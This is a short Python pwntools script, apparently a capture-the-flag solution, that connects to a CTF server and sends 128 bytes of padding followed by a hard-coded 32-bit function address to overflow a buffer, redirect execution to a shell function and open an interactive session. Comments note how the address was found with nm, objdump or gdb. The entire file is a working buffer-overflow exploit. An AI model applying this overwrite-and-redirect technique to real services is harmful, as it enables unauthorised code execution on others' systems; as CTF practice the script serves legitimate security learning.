#!/usr/bin/python3

from pwn import * 

p = remote("pwn.ctf.shellmates.club",1502)


adress_shell = p32(0x080491d6) #p32 a function that turn a value into a valid adress in 32 bits
							   # we got the shell adress usign nm || objdump -d || disassemble the function using gdb
print("Adress shell : {}".format(adress_shell))
input()
offset = 128
paylaod = b'A'*offset + adress_shell

p.sendline(paylaod)
p.interactive()